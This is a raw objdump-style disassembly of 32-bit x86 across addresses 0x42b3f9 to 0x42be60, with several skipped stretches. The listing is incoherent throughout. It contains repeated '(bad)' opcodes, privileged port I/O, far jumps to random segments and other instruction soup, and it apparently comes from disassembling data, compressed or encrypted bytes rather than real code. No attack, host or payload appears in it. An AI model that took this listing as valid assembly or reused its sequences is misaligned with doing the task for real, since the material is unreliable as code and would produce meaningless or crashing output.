  42b3f9:	int3   
  42b3fa:	push   ss
  42b3fb:	imul   edx,DWORD PTR [eax],0x2c9c33f0
  42b401:	push   es
  42b402:	clc    
  42b403:	jbe    0x42b395
  42b405:	scas   al,BYTE PTR es:[edi]
  42b406:	mov    ch,0xf9
  42b408:	cwde   
  42b409:	push   0xea63502c
  42b40e:	in     al,dx
  42b40f:	or     eax,0x3daa6e97
  42b414:	inc    edi
  42b415:	sub    eax,0xee53e710
  42b41a:	cmp    eax,DWORD PTR [esp-0x50]
  42b41e:	fidivr DWORD PTR [ecx+0x11]
  42b421:	sbb    edx,DWORD PTR [esi+esi*1]
  42b424:	adc    al,BYTE PTR [edi+0x3721a40f]
  42b42a:	mov    eax,ds:0xffc0f6a
  42b42f:	dec    esi
  42b430:	loop   0x42b490
  42b432:	push   esp
  42b433:	xlat   BYTE PTR ds:[ebx]
  42b434:	out    dx,eax
  42b435:	sti    
  42b436:	repz inc ebp
  42b438:	xor    eax,DWORD PTR [edx+ebx*4-0x4f]
  42b43c:	jecxz  0x42b4bc
  42b43e:	push   ebp
  42b43f:	sub    eax,0x2a
	...
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	icebp  
  42b4c1:	jnp    0x42b46a
  42b4c3:	jg     0x42b50c
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    BYTE PTR [eax-0x1f],dl
  42b4ce:	add    al,0x3d
  42b4d0:	adc    BYTE PTR [esi+0x3],ah
  42b4d3:	adc    dl,BYTE PTR [ebp-0x14]
  42b4d6:	xor    esi,ecx
  42b4d8:	cmp    DWORD PTR [edi+edi*4+0x22414730],esi
  42b4df:	cmc    
  42b4e0:	inc    ebx
  42b4e1:	popf   
  42b4e2:	sar    DWORD PTR [ebp+0x765206d7],1
  42b4e8:	sub    eax,0x8e62a8a7
  42b4ed:	into   
  42b4ee:	rol    DWORD PTR [ebx-0x4465f8b3],cl
  42b4f4:	lock in eax,0x9
  42b4f7:	in     al,dx
  42b4f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4f9:	and    BYTE PTR [edi+0x1c],ah
  42b4fc:	cwde   
  42b4fd:	fucomip st,st(7)
  42b4ff:	adc    edx,0xcd1442d2
  42b505:	(bad)  
  42b506:	inc    ebp
  42b507:	cld    
  42b508:	mov    ah,0x6d
  42b50a:	imul   edx,ecx,0x590289c5
  42b510:	retf   
  42b511:	pop    ecx
  42b512:	sub    DWORD PTR [esi-0x5ef51bb],ecx
  42b518:	shl    DWORD PTR [edx],1
  42b51a:	mov    al,ds:0x902d6ae2
  42b51f:	hlt    
  42b520:	mov    eax,ds:0xd6cc4f81
  42b525:	and    esi,ecx
  42b527:	loopne 0x42b4b2
  42b529:	mov    ds:0xf3dc1ab0,eax
  42b52e:	inc    eax
  42b52f:	(bad)  
  42b530:	shr    DWORD PTR [eax-0x3d1de173],1
  42b536:	cmp    eax,esi
  42b538:	jecxz  0x42b509
  42b53a:	add    al,0x95
  42b53c:	push   eax
  42b53d:	gs retf 
  42b53f:	lods   al,BYTE PTR ds:[esi]
  42b540:	call   FWORD PTR [ebp-0x19]
  42b543:	call   0xa915b3bc
  42b548:	dec    ebp
  42b549:	inc    esp
  42b54a:	add    DWORD PTR [ecx],edx
  42b54c:	and    DWORD PTR [edi-0x46397dd8],0x63b55210
  42b556:	and    eax,0xe422befb
  42b55b:	lock adc al,0x3b
  42b55e:	fcomp  QWORD PTR [ebp+0x1d]
  42b561:	adc    si,di
  42b564:	adc    DWORD PTR [edi],0xffffff8d
  42b567:	jp     0x42b53f
  42b569:	sbb    eax,0xec5e45c6
  42b56e:	and    ecx,esp
  42b570:	fcom   QWORD PTR [edi]
  42b572:	mul    DWORD PTR [edi-0x12d56e4b]
  42b578:	scas   al,BYTE PTR es:[edi]
  42b579:	stos   DWORD PTR es:[edi],eax
  42b57a:	pop    ss
  42b57b:	test   ecx,eax
  42b57d:	mov    esi,0xef8deaa
  42b582:	fistp  DWORD PTR [edx+ebp*1+0x4abc662b]
  42b589:	je     0x42b543
  42b58b:	outs   dx,BYTE PTR ds:[esi]
  42b58c:	rol    ecx,0xaa
  42b58f:	adc    ebx,DWORD PTR [esi+0x1d55c3a4]
  42b595:	and    BYTE PTR [esi-0x8],0xad
  42b599:	jno    0x42b568
  42b59b:	loop   0x42b5ea
  42b59d:	fld    TBYTE PTR [ebp+eiz*8+0x18]
  42b5a1:	xchg   edi,eax
  42b5a2:	adc    eax,ecx
  42b5a4:	mov    ebp,0x5ded8012
  42b5a9:	gs je  0x42b554
  42b5ac:	xor    cl,BYTE PTR [esi+0x559f909e]
  42b5b2:	fucomip st,st(6)
  42b5b4:	or     BYTE PTR [ebx+eiz*2-0x63],dl
  42b5b8:	leave  
  42b5b9:	pop    ss
  42b5ba:	ins    BYTE PTR es:[edi],dx
  42b5bb:	adc    al,0x67
  42b5bd:	test   BYTE PTR [esi+0x41b9],ah
	...
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    ch,ch
  42b641:	mov    ?,WORD PTR ds:0x1cb3c14
  42b647:	add    ch,dh
  42b649:	add    BYTE PTR [eax],al
  42b64b:	add    BYTE PTR [eax],dh
  42b64d:	aaa    
  42b64e:	push   ebp
  42b64f:	add    al,0x63
  42b651:	(bad)  
  42b652:	jo     0x42b693
  42b654:	jbe    0x42b615
  42b656:	fisubr WORD PTR [edx]
  42b658:	test   DWORD PTR [ebp+0x16a284ea],ecx
  42b65e:	jmp    0x6eff:0x999a8e74
  42b665:	xor    ch,dl
  42b667:	mov    al,ds:0xeb940946
  42b66c:	data16 cmp al,0x9c
  42b66f:	jg     0x42b62b
  42b671:	mov    DWORD PTR [ebp+0x41],edi
  42b674:	sub    eax,0x54932f62
  42b679:	pop    edx
  42b67a:	push   0xffffffbb
  42b67c:	and    edx,ebx
  42b67e:	xchg   edx,eax
  42b67f:	(bad)  
  42b680:	fcmovnu st,st(6)
  42b682:	retf   
  42b683:	or     DWORD PTR [ebp+0x6176ef20],ebp
  42b689:	and    esi,DWORD PTR [edx-0x38]
  42b68c:	cli    
  42b68d:	int    0xc
  42b68f:	imul   ecx,ebp,0x6b8512fb
  42b695:	arpl   WORD PTR [ecx],bx
  42b697:	adc    al,0x55
  42b699:	inc    DWORD PTR [esi+0x3]
  42b69c:	add    eax,0x1974834b
  42b6a2:	xor    eax,0x9eb217dc
  42b6a7:	adc    al,0x67
  42b6a9:	inc    ebp
  42b6aa:	dec    edx
  42b6ab:	arpl   WORD PTR [eax],di
  42b6ad:	pop    ebp
  42b6ae:	shl    dl,0x50
  42b6b1:	cmp    BYTE PTR [esi-0x4b],al
  42b6b4:	inc    eax
  42b6b6:	enter  0x8705,0x85
  42b6ba:	repz pop esp
  42b6bc:	cdq    
  42b6bd:	das    
  42b6be:	and    esi,DWORD PTR [ebp-0x2f]
  42b6c1:	aad    0x4
  42b6c3:	mov    cl,0x76
  42b6c5:	daa    
  42b6c6:	sub    ah,0xc3
  42b6c9:	pop    edx
  42b6ca:	pushf  
  42b6cb:	dec    eax
  42b6cc:	inc    esp
  42b6cd:	or     eax,0xa6463222
  42b6d2:	test   DWORD PTR [ecx+0x4fbedfda],0x3ef648f5
  42b6dc:	sub    al,BYTE PTR [eax-0x7e66b5b8]
  42b6e2:	mov    bh,0x66
  42b6e4:	arpl   WORD PTR es:[ecx],cx
  42b6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6e8:	xchg   DWORD PTR [edx],edx
  42b6ea:	jmp    0x42b6a2
  42b6ec:	outs   dx,DWORD PTR ds:[esi]
  42b6ed:	rol    esi,0x4f
  42b6f0:	push   esp
  42b6f1:	jle    0x42b6ae
  42b6f3:	add    al,0x69
  42b6f5:	call   FWORD PTR [esi-0x63]
  42b6f8:	xor    ch,bh
  42b6fa:	lahf   
  42b6fb:	ja     0x42b6fa
  42b6fd:	inc    esp
  42b6fe:	in     al,dx
  42b6ff:	scas   al,BYTE PTR es:[edi]
  42b700:	iret   
  42b701:	ficomp DWORD PTR [esi]
  42b703:	int    0xaa
  42b705:	test   DWORD PTR [ecx],eax
  42b707:	pop    ds
  42b708:	fwait
  42b709:	push   ss
  42b70a:	add    ecx,DWORD PTR [edi-0x3b14080d]
  42b710:	adc    DWORD PTR [esi+0x79],0x1fed5f80
  42b717:	fcomi  st,st(3)
  42b719:	arpl   WORD PTR ds:0x14cc7a74,di
  42b71f:	mov    al,ds:0xfe2290a0
  42b724:	lds    eax,FWORD PTR [esi+0x30]
  42b727:	jmp    0x42b748
  42b729:	xchg   DWORD PTR [esi],esi
  42b72b:	out    0x33,al
  42b72d:	push   eax
  42b72e:	pop    ds
  42b72f:	dec    edi
  42b730:	in     al,0xd9
  42b732:	pop    edx
  42b733:	nop
  42b734:	fstp   DWORD PTR [edx-0x79]
  42b737:	inc    esi
  42b738:	maskmovq mm6,mm3
  42b73b:	mov    ss,edi
  42b73d:	push   ds
  42b73e:	idiv   BYTE PTR [ecx]
  42b740:	sub    eax,DWORD PTR [eax]
	...
  42b7b2:	add    BYTE PTR [eax],al
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0x673528fb
  42b7c3:	test   eax,0x1cc31
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    BYTE PTR [esi-0x1489cd5f],ch
  42b7d1:	ins    DWORD PTR es:[edi],dx
  42b7d2:	adc    al,0xb8
  42b7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7d5:	mov    dl,0x1
  42b7d7:	daa    
  42b7d8:	mov    esi,0x9ae07e69
  42b7dd:	mov    ds:0x9dca3cee,eax
  42b7e2:	mov    bl,0xbf
  42b7e4:	mov    esp,0x5a7d2da4
  42b7e9:	rol    edi,cl
  42b7eb:	adc    dl,BYTE PTR [esi+eiz*8-0x60]
  42b7ef:	out    dx,al
  42b7f0:	repz xor DWORD PTR [edi+0x76],eax
  42b7f4:	dec    edx
  42b7f5:	sti    
  42b7f6:	sbb    edi,edx
  42b7f8:	cmc    
  42b7f9:	mov    ah,0x2c
  42b7fb:	and    DWORD PTR [esi+0x19232f78],esp
  42b801:	int3   
  42b802:	mov    ds:0xac61c222,eax
  42b807:	dec    esp
  42b809:	mov    ebp,0x4c67f848
  42b80e:	into   
  42b80f:	aad    0x19
  42b811:	pushf  
  42b812:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42b814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b815:	hlt    
  42b816:	test   cl,bl
  42b818:	dec    ecx
  42b819:	mov    bl,0x90
  42b81b:	aas    
  42b81c:	and    al,0x13
  42b81e:	aaa    
  42b81f:	pop    ds
  42b820:	add    eax,ebx
  42b822:	icebp  
  42b823:	aaa    
  42b824:	bound  ecx,QWORD PTR [edx]
  42b826:	xchg   edx,eax
  42b827:	jp     0x42b87c
  42b829:	(bad)  
  42b82a:	ror    dl,0xb7
  42b82d:	(bad)  
  42b82e:	pop    eax
  42b82f:	in     al,0x5d
  42b831:	cdq    
  42b832:	inc    ebx
  42b833:	xchg   edi,eax
  42b834:	adc    dh,BYTE PTR [ebx]
  42b836:	cld    
  42b837:	gs jno 0x42b7ec
  42b83a:	push   eax
  42b83b:	retf   
  42b83c:	test   eax,0xcb5108fd
  42b841:	sbb    al,0xbb
  42b843:	pop    esi
  42b844:	imul   ebp,DWORD PTR [bp+di-0x1e4b],0xdaf3ad53
  42b84d:	fadd   DWORD PTR [eax+ecx*1-0x45173736]
  42b854:	imul   edx,DWORD PTR [edi-0x1610cb47],0xffffff8e
  42b85b:	dec    eax
  42b85c:	dec    esp
  42b85d:	xchg   ecx,eax
  42b85e:	clc    
  42b85f:	xchg   esi,eax
  42b860:	addr16 clc 
  42b862:	cwde   
  42b863:	add    bl,BYTE PTR [ecx]
  42b865:	test   ch,bh
  42b867:	mov    bl,0x2
  42b869:	pop    edx
  42b86a:	(bad)  
  42b86b:	push   ebp
  42b86c:	mov    ecx,0x8cd35893
  42b871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b873:	xchg   edx,eax
  42b874:	jle    0x42b877
  42b876:	stos   BYTE PTR es:[edi],al
  42b877:	inc    ecx
  42b878:	jns    0x42b836
  42b87a:	js     0x42b856
  42b87c:	je     0x42b8bb
  42b87e:	dec    edx
  42b87f:	cmp    DWORD PTR [eax+ecx*1+0x6a70c9b1],ebp
  42b886:	push   esp
  42b887:	dec    ebp
  42b888:	jnp    0x42b8f7
  42b88a:	xor    eax,0xdbe25a4b
  42b88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b890:	sub    BYTE PTR [ecx-0x27dd895a],bh
  42b896:	ins    DWORD PTR es:[edi],dx
  42b897:	jbe    0x42b8e9
  42b899:	fcom   QWORD PTR [esi+0x15696edb]
  42b89f:	or     al,cl
  42b8a1:	mov    cl,0xa6
  42b8a3:	cmp    dl,BYTE PTR [esp+esi*1+0x5]
  42b8a7:	(bad)  
  42b8a8:	in     al,0xd4
  42b8aa:	dec    ecx
  42b8ab:	dec    ebx
  42b8ac:	xor    eax,0x383e452b
  42b8b1:	and    DWORD PTR ds:0x7a4d3a7b,esp
  42b8b7:	mov    ds:0xadb074d,eax
  42b8bc:	pop    edi
  42b8bd:	and    eax,0x2471d4
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	or     ebx,DWORD PTR [ecx+0x4d]
  42b943:	adc    eax,0x1cd26
  42b948:	cmc    
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    bl,bh
  42b94d:	push   ds
  42b94e:	int3   
  42b94f:	xchg   ebx,eax
  42b950:	fild   WORD PTR [esp+ebx*8-0x55aa4074]
  42b957:	inc    eax
  42b958:	mov    ah,0x7b
  42b95a:	(bad)  
  42b95b:	and    cl,BYTE PTR [ebp+0x75c2a887]
  42b961:	fild   QWORD PTR [eax+0x10bfc7c8]
  42b967:	imul   esp,DWORD PTR [ebp-0x45954960],0xca0cf3b5
  42b971:	xchg   esp,eax
  42b972:	sahf   
  42b973:	js     0x42b9b9
  42b975:	test   BYTE PTR [ebx+0x6f],ah
  42b978:	jo     0x42b9ca
  42b97a:	ret    
  42b97b:	fmul   DWORD PTR [edx+0x266cebd5]
  42b981:	pop    ebx
  42b982:	mov    al,0xb6
  42b984:	inc    ebp
  42b985:	imul   esp,edi,0x83156079
  42b98b:	or     esi,DWORD PTR [eax+esi*2+0x2ceed428]
  42b992:	repz pop edx
  42b994:	add    DWORD PTR [eax+0x1b7d975c],eax
  42b99a:	or     DWORD PTR [eax],0xcc321f34
  42b9a0:	shl    DWORD PTR [ebp-0x5f],0x68
  42b9a4:	xchg   edx,eax
  42b9a5:	(bad)
  42b9a8:	rol    BYTE PTR [edx+0x308610b9],1
  42b9ae:	add    esi,esp
  42b9b0:	mov    edx,0x259f4448
  42b9b5:	mov    dl,0xf2
  42b9b7:	adc    DWORD PTR [esp+edi*8],esp
  42b9ba:	jno    0x42b9eb
  42b9bc:	scas   eax,DWORD PTR es:[edi]
  42b9bd:	popf   
  42b9be:	dec    edi
  42b9bf:	jle    0x42b9d3
  42b9c1:	push   ebx
  42b9c2:	jp     0x42b98e
  42b9c4:	mov    ebx,DWORD PTR [edi+0x4b]
  42b9c7:	int3   
  42b9c8:	cmc    
  42b9c9:	or     edi,ebp
  42b9cb:	mov    esp,0x9a7e65b4
  42b9d0:	adc    edx,eax
  42b9d2:	(bad)  
  42b9d3:	not    DWORD PTR [edx]
  42b9d5:	pop    edi
  42b9d6:	mov    BYTE PTR [ecx+0x3f7be15e],ch
  42b9dc:	jmp    0x5a78:0xb5ec4081
  42b9e3:	adc    dh,BYTE PTR [ebx-0x4b]
  42b9e6:	retf   0xf8c6
  42b9e9:	icebp  
  42b9ea:	xor    al,bh
  42b9ec:	div    BYTE PTR [esi+0x3f]
  42b9ef:	js     0x42ba10
  42b9f1:	or     BYTE PTR [ebx-0x32080d83],ah
  42b9f7:	mov    dh,BYTE PTR [ecx]
  42b9f9:	inc    edx
  42b9fa:	fsubr  st,st(5)
  42b9fc:	mov    esi,0xe7930de3
  42ba01:	mov    esp,0x16b2acf
  42ba06:	int    0xbb
  42ba08:	in     al,0xc4
  42ba0a:	mov    al,ds:0x1c20176a
  42ba0f:	icebp  
  42ba10:	or     BYTE PTR [esi+eiz*1+0x10f9a372],dh
  42ba17:	mov    dh,0x3b
  42ba19:	jl     0x42ba3f
  42ba1b:	add    al,0x5b
  42ba1d:	mov    ecx,ecx
  42ba1f:	or     DWORD PTR [edi],0x76
  42ba22:	jae    0x42b9ea
  42ba24:	popa   
  42ba25:	push   ebp
  42ba26:	sar    ecx,1
  42ba28:	jmp    0x42ba11
  42ba2a:	lock xchg BYTE PTR [edi+0x1b],dh
  42ba2e:	pand   mm6,QWORD PTR [ebx]
  42ba31:	jmp    0x42ba16
  42ba33:	dec    edi
  42ba34:	scas   eax,DWORD PTR es:[edi]
  42ba35:	lahf   
  42ba36:	mov    ebx,0x5e89be68
  42ba3b:	dec    esi
  42ba3c:	sahf   
  42ba3d:	push   ebx
  42ba3e:	test   al,0x5d
  42ba40:	rol    DWORD PTR [eax],0x0
	...
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x60e8434c]
  42bac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bac3:	xor    bl,BYTE PTR [ebx]
  42bac5:	into   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [edx],bh
  42bacd:	cdq    
  42bace:	add    DWORD PTR [edx+0xa],esi
  42bad1:	pop    es
  42bad2:	imul   esp,DWORD PTR [edi],0x58
  42bad5:	adc    BYTE PTR [ebx+0x5b21bde],al
  42badb:	inc    eax
  42badc:	and    DWORD PTR [ebp+0x4a],0x6be69b2
  42bae3:	and    DWORD PTR [ebx-0x39],edx
  42bae6:	mov    esp,0xb2c530c2
  42baeb:	jge    0x42bacb
  42baed:	pop    edi
  42baee:	bound  edx,QWORD PTR [ecx+0x7748b676]
  42baf4:	and    esi,DWORD PTR [edi+0x71]
  42baf7:	into   
  42baf8:	clc    
  42baf9:	aad    0x10
  42bafb:	cs pop ebp
  42bafd:	adc    DWORD PTR [esi],0x2
  42bb00:	stos   DWORD PTR es:[edi],eax
  42bb01:	out    0xe3,eax
  42bb03:	imul   edx,DWORD PTR [esi-0x80],0xffffff9c
  42bb07:	jns    0x42babc
  42bb09:	pop    esp
  42bb0a:	jne    0x42bb84
  42bb0c:	stos   BYTE PTR es:[edi],al
  42bb0d:	xchg   DWORD PTR [esi+0x2b],ebp
  42bb10:	pop    edi
  42bb11:	and    al,0x7b
  42bb13:	je     0x42bb83
  42bb15:	push   ds
  42bb16:	jae    0x42bade
  42bb18:	push   0x407792ff
  42bb1d:	and    cl,BYTE PTR [edx]
  42bb1f:	(bad)  
  42bb20:	mov    ebp,0x9cc22786
  42bb25:	xor    edi,DWORD PTR [edx+0x696e3062]
  42bb2b:	sub    al,0xd1
  42bb2d:	daa    
  42bb2e:	xchg   BYTE PTR [esi-0x53],bl
  42bb31:	or     dl,BYTE PTR [esp-0x453d175e]
  42bb38:	dec    ebp
  42bb39:	cs pop esi
  42bb3b:	jg     0x42bb88
  42bb3d:	popa   
  42bb3e:	arpl   WORD PTR [edx],bx
  42bb40:	jl     0x42bb23
  42bb42:	(bad)  
  42bb43:	jo     0x42badb
  42bb45:	pop    edx
  42bb46:	(bad)  
  42bb47:	test   BYTE PTR [ebx],ch
  42bb49:	mov    esp,0xc4c00260
  42bb4e:	inc    edx
  42bb4f:	xchg   DWORD PTR [edx+0x61],edi
  42bb52:	push   esi
  42bb53:	fild   QWORD PTR [ecx]
  42bb55:	ja     0x42bb76
  42bb57:	add    al,0xcd
  42bb59:	arpl   WORD PTR [edi+0x7c],di
  42bb5c:	push   ebp
  42bb5d:	sub    esp,DWORD PTR [ebp+0x59a72dcb]
  42bb63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb64:	pop    ds
  42bb65:	and    ch,cl
  42bb67:	add    DWORD PTR [bx-0x608f],edx
  42bb6c:	mov    ebx,0x74280246
  42bb71:	ror    BYTE PTR [esi],1
  42bb73:	aam    0x27
  42bb75:	or     ah,BYTE PTR [eax-0x28]
  42bb78:	cmp    BYTE PTR [esp+eiz*2-0x50],dh
  42bb7c:	call   0x3b5d:0x6bdaff82
  42bb83:	or     al,cl
  42bb85:	jge    0x42bba7
  42bb87:	dec    ebp
  42bb88:	(bad)  
  42bb8a:	js     0x42bb4e
  42bb8c:	pop    esp
  42bb8d:	mov    eax,0xd596661a
  42bb92:	push   ds
  42bb93:	addr16 mov al,0x3d
  42bb96:	scas   eax,DWORD PTR es:[edi]
  42bb97:	jbe    0x42bbb2
  42bb99:	retf   
  42bb9a:	into   
  42bb9b:	cmp    esp,DWORD PTR [esi]
  42bb9d:	in     al,0x58
  42bb9f:	aam    0xad
  42bba1:	mov    BYTE PTR [eax],ch
  42bba3:	sbb    eax,0x7471f180
  42bba8:	shl    DWORD PTR [esi+0x75cf31b1],0x2a
  42bbaf:	or     DWORD PTR [eax+0x49],edi
  42bbb2:	int3   
  42bbb3:	jne    0x42bc2b
  42bbb5:	adc    cl,BYTE PTR [ebx]
  42bbb7:	sbb    dh,0x17
  42bbba:	clc    
  42bbbb:	sub    DWORD PTR [ecx*8+0x44fc6],ebx
	...
  42bc32:	add    BYTE PTR [eax],al
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x4e
  42bc41:	loope  0x42bca1
  42bc43:	pop    ebx
  42bc44:	adc    bh,cl
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [esi+eiz*8],bh
  42bc4e:	pop    es
  42bc4f:	mov    bl,BYTE PTR [edi-0x41]
  42bc52:	mov    cl,0x56
  42bc54:	stos   DWORD PTR es:[edi],eax
  42bc55:	cmp    ebp,DWORD PTR [ebx]
  42bc57:	or     al,BYTE PTR [ebp-0x6a591c1d]
  42bc5d:	mov    edi,DWORD PTR ds:0x3201305c
  42bc63:	jae    0x42bcc5
  42bc65:	xor    DWORD PTR [eax+0x2c7c0696],ebp
  42bc6b:	xchg   ecx,eax
  42bc6c:	jnp    0x42bc75
  42bc6e:	repnz push ebx
  42bc70:	mov    edx,0x91ab17a
  42bc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc76:	iret   
  42bc77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc78:	lods   eax,DWORD PTR ds:[esi]
  42bc79:	cmc    
  42bc7a:	mov    dl,0x22
  42bc7c:	mov    ebx,0xc145ad45
  42bc81:	dec    ebp
  42bc82:	push   0xffffff9f
  42bc84:	lock push ecx
  42bc86:	gs xor eax,0xc332ee6d
  42bc8c:	jnp    0x42bc68
  42bc8e:	push   eax
  42bc8f:	ficom  WORD PTR [ebx+0x7d]
  42bc92:	je     0x42bc32
  42bc94:	aaa    
  42bc95:	mov    ah,0x7b
  42bc97:	cmp    al,0xb7
  42bc99:	xchg   edx,eax
  42bc9a:	add    BYTE PTR [eax-0x53],ch
  42bc9d:	cdq    
  42bc9e:	sub    DWORD PTR [edx-0x122500dc],eax
  42bca4:	das    
  42bca5:	mov    ds:0x7737362,al
  42bcaa:	dec    ebx
  42bcab:	add    DWORD PTR [edx+0x76],esi
  42bcae:	mov    esp,0x497700fb
  42bcb3:	push   esi
  42bcb4:	lods   al,BYTE PTR ds:[esi]
  42bcb5:	test   al,0x99
  42bcb7:	mov    eax,0x9bdc56f0
  42bcbc:	inc    esp
  42bcbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcbe:	mov    esp,0x4ce1eee8
  42bcc3:	fwait
  42bcc4:	bnd jg 0x42bc65
  42bcc7:	sub    DWORD PTR [edi],ebp
  42bcc9:	sbb    al,0x85
  42bccb:	sub    eax,0xeecbd8f3
  42bcd0:	cli    
  42bcd1:	out    dx,eax
  42bcd2:	sub    DWORD PTR [ebx],ebp
  42bcd4:	ffree  st(7)
  42bcd6:	stc    
  42bcd7:	fnsave [edi+esi*2]
  42bcda:	sahf   
  42bcdb:	fist   WORD PTR [edx+ebx*8+0x7e]
  42bcdf:	dec    edi
  42bce0:	xor    DWORD PTR [ecx+ebx*4],esi
  42bce3:	jmp    0x42bca6
  42bce5:	xor    ah,BYTE PTR [esi-0x76]
  42bce8:	sbb    DWORD PTR [ebp*2-0x3d0bbf25],ebx
  42bcef:	ror    BYTE PTR fs:[esi+ecx*4+0x1c],cl
  42bcf4:	lds    ebp,FWORD PTR [edx+0x26019a13]
  42bcfa:	pusha  
  42bcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcfc:	push   0xffffffef
  42bcfe:	int3   
  42bcff:	jns    0x42bd06
  42bd01:	outs   dx,BYTE PTR ds:[esi]
  42bd02:	jne    0x42bc85
  42bd04:	xchg   ecx,eax
  42bd05:	push   si
  42bd07:	pop    es
  42bd08:	das    
  42bd09:	xor    al,0x7f
  42bd0b:	icebp  
  42bd0c:	jnp    0x42bd04
  42bd0e:	clc    
  42bd0f:	fld    TBYTE PTR [edx-0x2]
  42bd12:	out    dx,al
  42bd13:	inc    ebp
  42bd14:	mov    edx,0x5e612fbe
  42bd19:	jp     0x42bd74
  42bd1b:	xor    ebx,ebp
  42bd1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd1e:	enter  0xafca,0xd
  42bd22:	mov    ds,WORD PTR [ebp+0xf2887dc]
  42bd28:	aad    0xc6
  42bd2a:	iret   
  42bd2b:	sub    eax,0x96b66ebf
  42bd30:	inc    DWORD PTR [ecx]
  42bd32:	mov    eax,0x2be5cfde
  42bd37:	jge    0x42bd1d
  42bd39:	ds fwait
  42bd3b:	fwait
  42bd3c:	mov    ds:0x60026834,al
	...
  42bdb1:	add    BYTE PTR [eax],al
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	and    eax,0x5a5aa05
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    ch,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [edi-0x3c],ch
  42bdce:	rol    BYTE PTR [ecx],0xac
  42bdd1:	jae    0x42bdb8
  42bdd3:	(bad)  
  42bdd4:	pop    ecx
  42bdd5:	jle    0x42be3d
  42bdd7:	daa    
  42bdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bdd9:	xor    eax,0x7d483fe9
  42bdde:	cli    
  42bddf:	mov    al,0x40
  42bde1:	add    ebp,ebp
  42bde3:	xor    eax,0x727179b3
  42bde8:	fnsave [eax]
  42bdea:	inc    edi
  42bdeb:	jnp    0x42be31
  42bded:	inc    edi
  42bdee:	xchg   BYTE PTR [edi+0x2d],bl
  42bdf1:	ss into 
  42bdf3:	jecxz  0x42be6d
  42bdf5:	and    ch,bl
  42bdf7:	sahf   
  42bdf8:	call   0xd667:0x62d93671
  42bdff:	popf   
  42be00:	xchg   esp,eax
  42be01:	int    0x2b
  42be03:	adc    eax,0x501b252c
  42be08:	sbb    DWORD PTR [edx],ebx
  42be0a:	cmp    bl,BYTE PTR [edi-0x65]
  42be0d:	adc    dh,bh
  42be0f:	adc    edx,DWORD PTR [esi+0x21]
  42be12:	ret    0x872c
  42be15:	mov    ebp,0x7bb060f2
  42be1a:	sub    BYTE PTR [esi+0x5f],ch
  42be1d:	inc    esi
  42be1e:	cmp    BYTE PTR [ecx+ecx*1],dl
  42be21:	pop    ebp
  42be22:	pop    esi
  42be23:	adc    eax,0x27ccd490
  42be28:	add    BYTE PTR [ebx],ah
  42be2a:	push   cs
  42be2b:	mov    eax,ds:0xc931ffb8
  42be30:	sti    
  42be31:	pop    esi
  42be32:	imul   ebp,edx,0xf40b25fa
  42be38:	test   al,0xc6
  42be3a:	xor    al,0x2f
  42be3c:	mov    ds:0x67ee740e,eax
  42be41:	mov    esi,0xa9cb115b
  42be46:	shl    BYTE PTR [ebx],0x9d
  42be49:	clc    
  42be4a:	rol    BYTE PTR [edi],1
  42be4c:	mov    esp,0x1690aacd
  42be51:	inc    ebx
  42be52:	imul   edi,DWORD PTR [ecx+0x6d63982c],0x9cf1088b
  42be5c:	or     ecx,DWORD PTR [ecx+0x76]
  42be5f:	(bad)  
  42be60:	or     DWORD PTR [edx+0x45045799],eax
